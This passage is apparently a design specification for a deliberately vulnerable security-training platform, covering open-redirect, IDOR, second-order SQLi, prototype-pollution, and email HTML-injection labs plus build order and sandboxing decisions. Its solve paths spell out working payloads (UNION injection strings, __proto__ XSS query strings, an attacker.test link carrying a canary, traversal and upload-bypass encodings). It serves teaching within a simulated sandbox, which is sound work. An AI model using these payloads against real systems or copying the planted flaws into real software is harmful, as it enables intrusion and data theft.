  `?next=http://citadel.test.attacker.test/x`. D: resisted (stays in the lab).
- **model.ts seams.** `allowNext(level, next): boolean` (the flawed check per level, NOT `classifySimUrl`);
  `targetFor(level, next)`; victim log.
- **Pitfalls.** The level does its own parsing (RECIPES §8: labs teaching URL flaws parse themselves); never answer
  with `res.redirect(next)` — that would be a real open redirect off loopback. Always `sendSimRedirect`. The flag
  is the attacker-log hit, so the "proof" is the admin's browser reaching attacker.test.
- **Hints.** 1) ID: "Parameter 'next' memutuskan ke mana peramban pergi setelahnya." EN: "The 'next' parameter decides
  where the browser goes afterward." 2) ID: "'Dimulai dengan garis miring' tidak berarti 'tetap di situs ini'." EN:
  "'Starts with a slash' doesn't mean 'stays on this site'." 3) ID: "Mencocokkan nama host dengan 'mengandung' bisa
  ditipu oleh subdomain." EN: "Matching a hostname by 'contains' can be fooled by a subdomain."

### FP-09 — IDOR private message (BOLA) · `idor-dm`
- **Goal.** Read another user's private message.
- **Page.** A DM inbox; each message at `<lab>/dm/:id` (HTML) and `<lab>/api/dm/:id` (JSON); the admin's private DM
  holds the canary.
- **Levels.** **A** no ownership check anywhere; sequential numeric ids (admin's DM is #1). **T** the HTML page
  checks ownership; the JSON API does not. **I** ids are UUIDs (admin's discoverable in a public "recent threads"
  listing) and the API trusts a client `X-User-Id` header instead of the session. **D** ownership from the session
  only; UUIDs; uniform 404 for anything not owned.
- **Divine.** Session-derived ownership; uniform 404.
- **Flag proof.** Reading the admin's DM returns its body = the session canary = flag.
- **Victim + rearm.** None (direct IDOR).
- **Solve path.** A: `GET <lab>/dm/1`. T: `GET <lab>/api/dm/1`. I: `GET <lab>/api/dm/<admin-uuid>` with
  `X-User-Id: <admin>`. D: resisted (404).
- **model.ts seams.** `dms(req)` (per session, seeded with the admin's DM pinned), `canRead(level, state, id, req)`;
  `adminDmId(level)` seam; `canaryFor`. Mirror GK-12 closely.
- **Pitfalls.** No new engine. `challengeDb` or `perSession` map; pin the admin's DM so trimming never drops it.
  Uniform 404 at Divine (no existence oracle). Keep parallel to GK-12 but in the forum context (messages, not
  profiles).
- **Hints.** 1) ID: "Sebuah pesan punya pemilik; apa yang memeriksa bahwa itu Anda?" EN: "A message has an owner; what
  checks that it's you?" 2) ID: "Halaman dan API-nya mungkin tidak memeriksa hal yang sama." EN: "The page and its API
  may not check the same thing." 3) ID: "Sebuah header yang Anda kirim bukanlah identitas Anda." EN: "A header you send
  is not your identity."

### FP-10 — Second-order SQLi via username · `second-order-sqli` (levels A/I/D)
- **Goal.** Inject SQL that fires later, when a stored username is used in a query.
- **Page.** Registration (choose a username) + a "who's online"/profile-search page that later queries using the
  stored username.
- **Levels.** **A** registration parameterizes the insert (so direct injection fails) but the later "activity"
  query concatenates the stored username → a username like `x' UNION SELECT secret FROM vault--` fires on the second
  use. **I** the later query is parameterized too, but a reporting/admin view builds an `ORDER BY`/identifier from
  the stored username (identifiers can't be parameterized) → injection via the column/order context. **D** both uses
  parameterized; identifiers from an allowlist; usernames validated on input.
- **Divine.** Parameterize everywhere; allowlist identifiers.
- **Flag proof.** The second-use query returns the vault canary (via UNION / ORDER-BY oracle) = flag. (RECIPES §4(g):
  cap result size; no genuinely slow SQL.)
- **Victim + rearm.** None (the player registers then triggers the later query).
- **Solve path.** A: register `x' UNION SELECT flag,2 FROM vault-- -`, then open the activity page. I: register a
  name that injects into `ORDER BY`. D: resisted.
- **model.ts seams.** `register(req)` (stores username), `activityQuery(level, db, username)`,
  `usersDb`/`vaultDb` via `challengeDb`; `canaryFor`.
- **Pitfalls.** Catalog gives **A I D** — keep it. No new engine (`challengeDb`, `perLevel`/`perSession`). The lesson
  is *where* the data is trusted on the **second** use; the insert being safe is the point. Bound the username length
  and the result size (§4(g)). Keep distinct from the Relic Market SQLi labs (which are first-order).
- **Hints.** 1) ID: "Pendaftaran mungkin aman, tetapi di mana lagi nama Anda dipakai?" EN: "Registration may be safe,
  but where else is your name used?" 2) ID: "Tidak setiap bagian query bisa diparametrisasi — nama kolom, misalnya."
  EN: "Not every part of a query can be parameterized — a column name, for instance." 3) ID: "Data yang tersimpan hari
  ini bisa menjadi kode besok." EN: "Data stored today can become code tomorrow."

### FP-11 — Client-side prototype pollution → XSS · `proto-pollution` (levels A/I/D)
- **Goal.** Pollute `Object.prototype` from a URL/JSON so a client gadget renders attacker HTML.
- **Page.** A forum "preferences from link" feature: a vendored client script parses `location.search`/a JSON config
  and deep-merges it into a defaults object, then uses a property (e.g. `cfg.theme.header`) in an HTML sink. Script
  shown verbatim + twinned (E3).
- **Levels.** **A** a recursive merge with no key guard → `?__proto__[header]=<img src=x onerror=hvwa('n')>` pollutes
  and the gadget renders it. **I** the merge guards `__proto__` but not `constructor.prototype` (bracket path), or
  guards own keys but follows `constructor[prototype][header]`. **D** null-prototype target, `Object.hasOwn`/key
  allowlist, no merge of untrusted keys; the sink uses `textContent`.
- **Divine.** Reject dangerous keys (`__proto__`,`constructor`,`prototype`), null-proto target, safe sink (mirrors
  GK-14's `isDangerousKey`/`safe merge`).
- **Flag proof.** The **twin** `merge(src)` + `render(cfg)` (E3) produces HTML; `xssOracle(html,marker).executes`
  → flag. Player sees it fire in the preview frame with the real client script.
- **Victim + rearm.** `sendLinkAction` ("the admin opens the preferences link you send"); the twin runs on that
  query. `rearm: () => {}`.
- **Solve path.** A: `?__proto__[header]=<img src=x onerror=hvwa('n')>`. I:
  `?constructor[prototype][header]=<img …>`. D: resisted.
- **model.ts seams.** `merge(level, src)` (the twin; mirrors the shipped script), `render(cfg)`, `clientScriptSrc`,
  `markerFor`. Reuse GK-14's `isDangerousKey`/`isPlainObject` as the Divine primitive.
- **Pitfalls.** Catalog gives **A I D** — keep it. Depends on **E0** (oracle) + **E3** (merge twin). The platform's
  own `safeMerge`/key guard (GK-14) must be used for Divine, and the pollution must stay inside the twin — never
  mutate the host `Object.prototype` (the twin merges into a null-proto object and records the gadget path, it does
  not actually pollute the server's prototype). Twin and shipped script stay in lock-step (test on a corpus).
- **Hints.** 1) ID: "Menggabungkan data tak tepercaya ke sebuah objek bisa menyentuh objek lain." EN: "Merging
  untrusted data into one object can touch every other object." 2) ID: "Ada lebih dari satu nama untuk induk sebuah
  objek." EN: "There's more than one name for an object's parent." 3) ID: "Properti yang 'tidak ada' tiba-tiba
  muncul, lalu dipakai sebagai HTML." EN: "A property that 'isn't there' suddenly appears, then is used as HTML."

### FP-12 — HTML injection in email notification · `email-html-injection`
- **Goal.** Inject HTML into a notification email the admin receives (phishing link / spoofed content), since the
  mail client runs no JS.
- **Page.** A "report a post" / "mention a user" feature that emails a moderator a notification containing an
  attacker-controlled field (the reporter's display name or the reported excerpt).
- **Levels.** **A** the field is concatenated into the HTML email body raw → an attacker `<a href="http://attacker.test/…">`
  or `<img src="http://attacker.test/pixel">` renders; the admin clicks/loads it → attacker log. **T** escapes `<`/`>`
  in the body but builds the email's subject or a link's `href` from the field unescaped → attacker URL in a real
  link. **I** escapes the body and subject but allows a set of "safe" formatting tags including `<a>` with an
  unchecked `href` scheme, or interpolates the field into an attribute. **D** escape all fields; build links only
  from server-side data; text-only email or an allowlist.
- **Divine.** Escape everything; no attacker-controlled URLs in links; prefer text email.
- **Flag proof.** The notification is delivered to `ADMIN_MAILBOX`; the admin "checks mail"; the sim's **link/resource
  oracle** (E0 variant — detects an `<a>`/`<img>` to attacker.test, NOT script execution) fires the admin's
  click/load to attacker.test → the attacker log hit carries the canary = flag. Distinct from script-XSS: email runs
  no JS.
- **Victim + rearm.** `checkMailAction` (the moderator opens the newest mail and clicks its first link).
  `rearm: () => {}`.
- **Solve path.** A: display name `<a href="http://attacker.test/?c=CANARY">click</a>` (or an `<img>`). T: inject the
  `href`/subject. I: `<a href="javascript:…">` won't run in mail — use an `http://attacker.test` link via the allowed
  `<a>`. D: resisted (escaped; no attacker links).
- **model.ts seams.** `buildEmail(level, field): {subject, body, links}`; delivered via `world.inbox.deliver`;
  `canaryFor`. The oracle variant `linkSinks(html)` returns attacker-destined `<a>`/`<img>`.
- **Pitfalls.** Depends on **E0** (link/resource detection; reuse the parse5 walk but score URL-to-attacker, not
  script). The admin's click is a `checkMailAction` following `links[0]`; the mail's links are an explicit list
  (RECIPES §8), so the oracle must populate `links` from the parsed email HTML. Keep FP-12 clearly "HTML injection
  (phishing)" not "script XSS".
- **Hints.** 1) ID: "Notifikasi email menampilkan nama yang Anda pilih." EN: "The email notification shows the name you
  chose." 2) ID: "Klien email tidak menjalankan skrip, tetapi tetap menampilkan tautan dan gambar." EN: "Mail clients
  don't run scripts, but they still show links and images." 3) ID: "Sebuah tautan di dalam email bisa menunjuk ke mana
  pun yang Anda tulis." EN: "A link inside the email can point wherever you write."

---

## C. Ordering, dependencies, and flagged design changes

**Build order.** Engine first (each with a spec-review gate), then lab batches of 3–5 related labs, sequential
(one implementer per batch, review per batch), exactly like Batches A–D.

1. **E0 — XSS oracle + preview** (dep: `parse5`). Gate.
2. **E2 — uploads/sim-FS/zip/image** (no new dep) ∥ **E1 — sim cross-site + presets** (no new dep). Two gates; may
   run in parallel after E0.
3. **E3 — client-JS twin helpers** (folds into E0 if small). Gate.
4. **E4 — SSTI sandbox** (deps: `quickjs-emscripten-core`, `@jitl/quickjs-wasmfile-release-sync`, `nunjucks`). Gate.

**Lab batches (each ~3–5 labs, sequential):**
- **SC-batch 1 — server-sink XSS:** SC-01, SC-02, SC-04, FP-05 *(dep: E0)*. (FP-05 rides along with the XSS group
  even though it is a Forum lab — same oracle, same shape.)
- **SC-batch 2 — DOM/mXSS:** SC-03, SC-06, FP-11 *(dep: E0, E3)*.
- **SC-batch 3 — uploads & files:** SC-05, SC-07, SC-08, SC-09, SC-10, SC-11 *(dep: E2; SC-05/09 also E0)*. Split
  into two sub-batches if large: {SC-07, SC-08, SC-09} (upload filters) and {SC-05, SC-10, SC-11} (SVG/zip/
  traversal).
- **FP-batch 1 — CSRF/CORS/clickjacking:** FP-01, FP-02, FP-03, FP-04 *(dep: E1)*.
- **FP-batch 2 — redirect/IDOR/SQLi:** FP-08, FP-09, FP-10 *(no engine dep)*.
- **FP-batch 3 — SSTI + email:** FP-06, FP-07, FP-12 *(dep: E4; FP-12 also E0)*.

**Dependency summary (lab → engine task):**

| Engine task | Labs |
|---|---|
| E0 (XSS oracle) | SC-01, SC-02, SC-04, SC-05, SC-06, SC-09, FP-05, FP-11, FP-12 |
| E1 (cross-site sim) | FP-01, FP-02, FP-03, FP-04 |
| E2 (uploads/FS) | SC-05, SC-07, SC-08, SC-09, SC-10, SC-11 |
| E3 (JS twins) | SC-03, FP-11 |
| E4 (SSTI sandbox) | FP-06, FP-07 |
| none | FP-08, FP-09, FP-10 |

**Flagged design changes from the catalog (with reasons):**

1. **No level-set changes.** Every catalog row's level set is implementable as written. A/T/I/D where given,
   A/I/D for SC-06, SC-09, FP-07, FP-10, FP-11, A/T/D for FP-04 — all kept. (I audited each for a *distinct* flaw per
   rung; the A/I/D and A/T/D rows genuinely lack a fourth distinct rung, so the catalog is right to omit one.)
2. **SSTI uses QuickJS-WASM in-process, not a Docker RCE worker** (A4). The plan's P0-SEC note anticipates an RCE
   worker *container* for FP-07. A memory-safe WASM interpreter gives stronger isolation (no shared kernel, no host
   bindings) with **no** new compose service, honouring Phase 2's "no new infra". This is the one architectural
   divergence; it needs controller sign-off (Q3) because it adds a dependency instead of a service.
3. **No multipart dependency.** The plan asks whether a dep is needed for multipart; Node 22's built-in
   `Response.formData()` parses it (proven), so none is. (`formidable` is present transitively but should **not** be
   adopted.)
4. **FP-05 is built in the SC XSS batch** (same oracle/shape) even though it is a Forum lab — a sequencing note, not
   a catalog change; it still registers under `forum`.
5. **CSRF labs set their session cookie's SameSite as a per-level decision** (A at `SameSite=None` to be
   exploitable). This is faithful to real misconfigurations and necessary for the sim's SameSite model to make the
   flaw visible in View Source; noted so implementers don't "fix" it by accident.

---

## D. Open questions for the controller (each with a recommended answer)

**Q1 — New dependency: `parse5` (XSS oracle).** Needed for a correct, auditable static XSS oracle (hand-rolling
HTML5 tree construction / mXSS is infeasible). Adds `parse5@8.0.1` + `entities` (~0.8 MB), lives in `core/xss/`
outside `core/sim/` (no-network guard untouched). **Recommended: accept.** It is the reference HTML5 parser; the
alternative (a headless-browser container) is far heavier and brings a network stack we forbid.

**Q2 — New dependencies: `quickjs-emscripten-core` + `@jitl/quickjs-wasmfile-release-sync` + `nunjucks` (SSTI
sandbox).** All ≥ 2 weeks old (QuickJS 0.32.0 2026-02-16; Nunjucks 3.2.4 2023). QuickJS is a memory-safe WASM JS
interpreter; Nunjucks loads **only** inside it. **Recommended: accept**, pairing with Q3. Net footprint ~2.5 MB,
in-process, no network.

**Q3 — New compose service for FP-07, or QuickJS-WASM in-process?** The plan's P0-SEC foresaw an RCE worker
container. **Recommended: QuickJS-WASM in a `worker_thread`, no new compose service.** It is stronger isolation
(WASM memory-sandbox, no host bindings, no shared kernel surface, no network) than a container and keeps Phase 2
infra-free; it inherits the app container's read-only rootfs / non-root / `pids_limit` / `mem_limit`, and adds its
own CPU/memory/stack bounds (all measured). If the controller rejects the QuickJS dependency, the fallback is the
minimal `sandbox` container on the internal `lab` network (A4), at the cost of more infra for less isolation.

**Q4 — Platform security headers.** Phase 2 needs **no global header change**. All CSP / `X-Frame-Options` / CORS
headers are **route-scoped** to specific lab levels via a new `core/http.ts setLabHeaders` helper; platform and
Divine pages are untouched, and the transparent proxy stays as-is. **Recommended: approve the per-route helper; no
global CSP.** (A global CSP risks htmx/inline-EJS on the portal and the challenge player page, which ship no CSP
today.)

**Q5 — Sandboxed preview iframe for XSS observation.** XSS labs render the live payload for the player inside
`<iframe sandbox="allow-scripts">` (null origin) so they see it fire without it touching `hvwa_sid` (HttpOnly
anyway) or the platform. **Recommended: approve.** It is the safe way to let the player watch real XSS; the flag
still comes only from the server-side oracle. Residual same-origin self-harm (payload pasted outside the frame,
player's own session, loopback) is documented and accepted.

**Q6 — `express.raw` on upload routes.** Upload labs mount `express.raw({type:'multipart/form-data', limit:'2mb'})`
on their own routes; the app-wide `express.json()/urlencoded()` ignore multipart, so there is no conflict, and nginx
already allows upload bodies. **Recommended: approve** (route-local, no platform change).

**Q7 — "Execution" semantics (SC-07/08/09, FP-07).** No uploaded code and no template ever runs for real:
"webshell execution" is a marker-matching simulated interpreter over the sim FS; "RCE" reads a planted flag through
a fake `child_process` bridge inside the WASM sandbox. **Recommended: confirm** this simulation boundary is the
intended teaching model (it matches GK-06's simulated filesystem and the deterministic-victim ethos).

---

## Owner decisions (2026-11-16, binding — answered by the project owner)

- **Q1 XSS oracle:** accept `parse5@8.0.1` (in `core/xss/`, outside `core/sim/`).
- **Q2 + Q3 SSTI sandbox:** accept QuickJS-WASM in a `worker_thread` (`quickjs-emscripten-core@0.32.0`, `@jitl/quickjs-wasmfile-release-sync@0.32.0`, `nunjucks@3.2.4` loaded only inside QuickJS). No new compose service.
- **Q4 + Q5 headers / preview:** approve the route-scoped `core/http.ts setLabHeaders` helper (no global CSP change) AND the `<iframe sandbox="allow-scripts">` preview for watching payloads fire.
- **Q6 `express.raw` on upload routes:** approved by the controller (route-local).
- **Q7 execution semantics:** simulated only — no uploaded file or template ever executes for real; "webshell" = marker-matching interpreter over the sim FS, "RCE" = planted flag via a fake bridge inside the WASM sandbox.
- **Ordering note (controller):** the shared-template task (twin → `core/victim.ts` with cookie-attribute options, district-agnostic curl helpers, bounded-map helpers, victim-lab testkit) lands before any FP/SC victim lab.

---

## Amendments after the E2 review (2026-11-16, binding — override the sections above where they differ)

- **A3 sim FS caps:** per instance, enforced in core `SIMFS_LIMITS` (32 files, 128 KiB/file, 256 KiB total), not 2 MiB in the lab model. The process-wide sim budget is weighted by BYTES (world ≈1 MiB, simFs ≈320 KiB, total 96 MiB); uploads pass a core `uploadGate()` (≤4 in flight) before `express.raw`.
- **SC-07 Templar:** the Windows-like server strips trailing dots and spaces before its exec mapping — in the level file (`shell.php.`); the sim FS keeps names exactly.
- **SC-08:** Acolyte's solve is `shell.php` (the listed `x.php.jpg` also beats Templar, breaking step-up). Inquisitor: "rejects any dot-separated segment equal to `php` (case-insensitive) in the RAW name, then decodes once; the exec mapping uses the FIRST extension and ends the name at a NUL" — so `shell.php%00.jpg`, `shell%2ephp`, `shell.php%2ejpg` pass while Templar's `shell.php.jpg` is refused. NUL truncation lives in the level file (the sim FS keeps NUL).
- **SC-09 Divine:** simulated re-encode = a server-made placeholder of fixed type and CONSTANT size via core `placeholderImage(sniff)`; no player byte survives; no decoder dependency. Never allocate width×height.
- **SC-07/08/09 page:** documents the simulated server's single statement `<?hvwa CANARY ?>` (it is the server's language, not a payload).
- **SC-05 Inquisitor:** the simulated serving (`image/svg+xml`, inline) is judged by the E0 oracle and shown as text; the REAL route always sends an inert download; the payload fires only in E0's sandboxed preview.
- **SC-10 Templar:** "removes every `../` in ONE pass (`replaceAll`)" so `....//` is needed (stripping a leading `../` once is beaten by one more `../`, too close to Acolyte).
- **SC-10 / SC-11 Inquisitor:** `simFs({ separators: '/\' })`; the page explains Python-on-Windows `zipfile` turns `\` into `/` (set `ZipInfo.filename` after creating it).
- **SC-10 / SC-11 "absolute name" flaws:** the level writes its own join that RESETS on an absolute name (like `os.path.join`) — visible in View Source.
- **SC-11 Inquisitor:** Express decodes the query once, so `%2e%2e%2f` arrives as `../` and is refused; the intended solve is double encoding `%252e%252e%252f…` (or the level reads the raw query — pick one and state it in the level file).
- **Zip handling in levels:** skip `e.directory` entries; call `readZip(b, { totalBytes: SIMFS_LIMITS.totalBytes })`; labs that store uploads pass `maxFileBytes: SIMFS_LIMITS.fileBytes`.
- **Q6/413:** a body over the cap gets the platform's generic 413 (it never reaches lab code); an optional route-level error handler may style it.

## Amendments after the E0 review (2026-11-16, binding — override the sections above where they differ)

- **A1 / all XSS labs:** never place player input inside `<script>` or event-handler CODE at any level — the static oracle cannot judge JS-string escaping (a marker inside a JS string counts as executing). The exfil request (`XSS_STEAL_URL`) carries no Referer (accepted simplification). The canary must be read after the response's own `Set-Cookie` (E0 fix in progress; until then RECIPES documents it).
- **A5 / headers:** only CSP `sandbox` is modelled by the oracle; other CSP directives are not evaluated, so **a level whose only fix is a CSP is not a Divine** — Divine must encode/sanitize correctly. `setLabHeaders` is owned by **E1** and must land before SC batch 1 (SC-01 Divine, SC-05 Divine headers).
- **E3:** reduced to `safeishMerge` only (null-prototype, GK-14 key guard, records the gadget path); the DOM twin is E0's `dom` hook + `XssPage.hash`. E3 gates FP-11 (and SC-03 needs only E0).
- **SinkKind:** `style-import` dropped (CSS never runs script in current browsers); CSS URLs appear as resources in `linkSinks`.
- **SC-01 Inquisitor:** interaction sinks count by default, so `x onmouseover=…` (no angle brackets) is an ACCEPTED solve besides `autofocus onfocus`; step-up still holds (Acolyte/Templar payloads need `<`, which Inquisitor escapes).
- **SC-04 Inquisitor:** drop the `![x](data:…)` alternative (`data:` frames/images are isolated and never count as executing); the solve is the title/attribute breakout.
- **SC-05:** cap the uploaded SVG at ~12 KiB (the whole citadel page must stay under the oracle's 16 KiB) and judge ONE sigil per page; the citadel handler returns a raw `SimResponse` (a `Reply` can't carry Content-Type/Content-Disposition) and serves the SVG INLINE inside an HTML page with explicit Content-Type, Content-Disposition and CSP; XML content types are judged only if well-formed with the SVG namespace (E0 fix). SMIL `href` animation (`<animate attributeName=href values="javascript:…">`) is an interaction sink (E0 fix).
- **SC-06:** the flag proof is the victim page's `executes`. `mxss` on the player's INPUT is valid only for Acolyte's namespace-confusion flaw; Inquisitor's flaw is the lab's own serializer (parse5's round trip does not see it); Divine uses the `roundTrip` fixed point. Note: parse5 uses the classic serializer (models a server-side parse5 sanitizer; browsers since 2025 escape `<`/`>` in attribute serialization), and Chrome's new `<select>` parsing diverges from parse5 8.0.1 (E0 handles or pins it).
- **SC-09:** citadel handler returns a raw `SimResponse` (as SC-05).
- **FP-12 flag proof:** shown when the attacker log holds a hit made by the admin's `checkMailAction` to an `attacker.test` URL that `linkSinks(mail)` listed, below Divine. The lab must have NO free-form send-link action (it would let the player forge the hit).

## Amendments after the SC-07/08/10/11 review (2026-11-17, binding)

- **SC-05 / SC-09 batch prerequisites (first commit of that batch):** the Scroll Desk (`scriptorium/_shared/desk.ts`) does not fit SC-05 and fits SC-09 only for the `<?hvwa?>`-tail path. Extend it with `newDesk({ seed, separators })`, a view-partial slot + `extra(req)` view data, a `statementNote` toggle, and a raster-only preview route (server-chosen type; `placeholderImage` at Divine; `nosniff`; CSP sandbox; fixed CSS box). Keep `/uploads` as the INERT real-browser download (matches the E0 rule). The raw-`SimResponse` citadel handler belongs to E0's victim plumbing, not the desk. Build SC-05 on `_shared/lab.ts` (`receive`, `mountUpload`, `uploadCurl`) with its own view and the E0 victim; it passes `{ maxFileBytes: 12 * 1024 }`.
- **SC-11 Inquisitor:** via the page form (or its `--data-urlencode` curl line) a single-encoded `%2e%2e%2f…` also solves it, because the client adds the first layer — same lesson, stated in the level file.
- **SC-12 (Phase 3) must NOT repeat SC-11's double-encoding lesson:** design it around Unicode / overlong / full-width normalisation or the raw query, so the two labs teach different things.

## Amendments after the E0 re-review (2026-11-17, binding)

- **XML / SVG judging (corrects the SC-05 line above):** XML documents are judged as Chrome reads them — PARTIAL documents count (what was read before an error stays; a script needs its end tag; the root `<svg onload>` needs the whole document well-formed). "Judged only if well-formed" is superseded.
- **DTDs:** a DOCTYPE whose internal subset has `<!ENTITY` or `<!ATTLIST` is refused by the oracle (`limited: 'dtd'`) because Chrome runs entity- and ATTLIST-default payloads the static reader cannot expand. Therefore: any level that serves player XML (SC-05, SC-09, SC-14/15 later) must refuse a DOCTYPE with an internal subset **at least at Divine**; no intended solve may depend on a DTD; each such lab's spec asserts Divine never yields `limited: 'dtd'`. (XXE labs SC-14/15 in Phase 3 teach DTDs on the SERVER parser — they must not route the player's DTD through the XSS oracle.)

## Amendments after the SC-batch 1 review (2026-11-17, binding)

- **SC-02 Inquisitor:** a one-pass regex allowlist that drops attributes (bare tags) — `<im<x>g …>` rejoins after the single pass; a second same-kind bypass is `<img src=x onerror=M <b>`. This departs from the per-lab text (which kept attributes) to keep SC-02 and FP-05's flaws non-overlapping (FP-05 teaches the attribute/scheme allowlist). SC-02 Divine allows no attributes or links.
- **Preview fidelity:** `javascript:` links do not run inside `<iframe sandbox="allow-scripts">` in Chrome; the preview shim runs a clicked `javascript:` link's decoded code as an inline script inside the sandboxed frame so the player can watch SC-04 Templar / FP-05 Inquisitor payloads fire (owner decision Q5). Autofocus does not fire on load in a cross-origin frame (SC-01 Inquisitor: the player clicks the field; the admin's view fires on load).
- **Known oracle false positives (non-Divine levels only):** payloads Chrome rejects as syntax errors (e.g. SC-01 Templar nested `<scr<script>ipt>`, some unquoted `onmouseover=` forms) may be judged as executing. Accepted for now; Divine rows agree with Chrome 66/66.
- **Next XSS labs (SC-03, SC-06, FP-11, FP-12) template prep:** `xssVictim` must pass the `dom` / `interact` options (SC-03, FP-11); `describeXssLab` needs an override for DOM-XSS labs where the fragment itself doesn't run; FP-12 proves via a mail link hit, not `keySignIn`.
